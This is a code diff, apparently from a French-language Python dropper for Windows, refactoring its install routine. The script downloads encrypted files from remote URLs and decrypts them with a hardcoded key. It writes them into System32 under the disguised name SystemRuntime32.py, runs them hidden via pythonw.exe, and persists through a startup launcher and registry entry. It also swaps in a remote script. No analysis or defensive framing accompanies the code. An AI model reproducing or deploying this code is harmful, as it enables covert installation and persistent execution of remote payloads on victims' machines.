@@ -3,6 +3,7 @@ import winreg
 import tempfile
 import requests
 import subprocess
+import time
 
 CLE = "LUCORACORE987"
 URLS = {
@@ -30,40 +31,61 @@ def write_file_binary(path, content_bytes):
         f.write(content_bytes)
 
 
-def download_and_install():
-    paths = {}
+def file_exists_and_not_empty(path):
+    return os.path.isfile(path) and os.path.getsize(path) > 0
+
+
+def download_decrypt_write(filename_enc, url):
+    print(f"[i] Téléchargement de {filename_enc} depuis {url}...")
+    try:
+        response = requests.get(url, timeout=15)
+        response.raise_for_status()
+    except Exception as e:
+        print(f"[!] Erreur téléchargement {filename_enc}: {e}")
+        return False
+
+    print(f"[i] Décryptage de {filename_enc}...")
+    decrypted_bytes = decrypt(response.content, CLE)
+    if not decrypted_bytes:
+        print(f"[!] Échec du décryptage de {filename_enc}")
+        return False
+
+    target_path = os.path.join(SYSTEM32, filename_enc[:-4])
+    print(f"[i] Écriture du fichier décrypté dans {target_path}...")
+
+    try:
+        write_file_binary(target_path, decrypted_bytes)
+    except Exception as e:
+        print(f"[!] Erreur écriture fichier {target_path} : {e}")
+        return False
+
+    # Vérification existence et taille
+    if not file_exists_and_not_empty(target_path):
+        print(f"[!] Fichier {target_path} inexistant ou vide après écriture.")
+        return False
+
+    print(f"[✓] Script installé : {target_path}")
+    return target_path
+
+
+def download_and_install_all():
+    installed_paths = {}
     for filename_enc, url in URLS.items():
-        try:
-            print(f"[i] Téléchargement de {filename_enc} depuis {url}...")
-            response = requests.get(url, timeout=15)
-            response.raise_for_status()
-
-            print(f"[i] Décryptage de {filename_enc}...")
-            decrypted_bytes = decrypt(response.content, CLE)
-            if not decrypted_bytes:
-                print(f"[!] Échec du décryptage de {filename_enc}")
-                return None
-
-            target_path = os.path.join(SYSTEM32, filename_enc[:-4])
-            print(f"[i] Écriture du fichier décrypté dans {target_path}...")
-            write_file_binary(target_path, decrypted_bytes)
-
-            if not os.path.isfile(target_path):
-                print(f"[!] Le fichier {target_path} n'a pas été créé.")
-                return None
-
-            print(f"[✓] Script installé : {target_path}")
-            paths[filename_enc[:-4]] = target_path
-
-        except Exception as e:
-            print(f"[!] Erreur lors du traitement de {filename_enc} : {e}")
+        target_path = download_decrypt_write(filename_enc, url)
+        if not target_path:
+            print("[!] Installation interrompue.")
             return None
-    return paths
+        installed_paths[filename_enc[:-4]] = target_path
+        time.sleep(1)  # pause courte entre fichiers
+    return installed_paths
 
 
 def run_systemruntime32_immediately(path):
     print(f"[i] Lancement immédiat de {path} en arrière-plan.")
-    subprocess.Popen(['pythonw.exe', path], close_fds=True)
+    try:
+        subprocess.Popen(['pythonw.exe', path], close_fds=True)
+    except Exception as e:
+        print(f"[!] Erreur lancement immédiat de {path} : {e}")
 
 
 def create_launcher():
@@ -72,10 +94,14 @@ import os
 subprocess.Popen(['pythonw.exe', os.path.join(r'{SYSTEM32}', 'SystemRuntime32.py')], close_fds=True)
 """
     launcher_path = os.path.join(SYSTEM32, LAUNCHER_NAME)
-    with open(launcher_path, "w", encoding="utf-8") as f:
-        f.write(launcher_code)
-    print(f"[✓] Launcher créé : {launcher_path}")
-    return launcher_path
+    try:
+        with open(launcher_path, "w", encoding="utf-8") as f:
+            f.write(launcher_code)
+        print(f"[✓] Launcher créé : {launcher_path}")
+        return launcher_path
+    except Exception as e:
+        print(f"[!] Erreur création launcher : {e}")
+        return None
 
 
 def add_to_startup(py_path):
@@ -134,22 +160,31 @@ def remplacer_script_depuis_s_path():
 
 
 def main():
+    print("[i] Vérification des droits administrateur...")
     if not os.access(SYSTEM32, os.W_OK):
         print("[!] Ce script doit être exécuté avec des droits administrateur.")
         return
 
-    paths = download_and_install()
+    print("[i] Démarrage installation et décryptage des scripts...")
+    paths = download_and_install_all()
     if not paths:
-        print("[!] Installation échouée.")
+        print("[!] Installation échouée, arrêt.")
         return
 
+    print("[i] Tous les scripts installés correctement.")
     if 'SystemRuntime32.py' in paths:
         run_systemruntime32_immediately(paths['SystemRuntime32.py'])
+    else:
+        print("[!] SystemRuntime32.py absent, impossible de lancer.")
 
     launcher_path = create_launcher()
-    add_to_startup(launcher_path)
+    if launcher_path:
+        add_to_startup(launcher_path)
 
+    print("[i] Remplacement éventuel du script distant...")
     remplacer_script_depuis_s_path()
+
+    print("[✓] Toutes les étapes terminées.")
 
 
 if __name__ == "__main__":
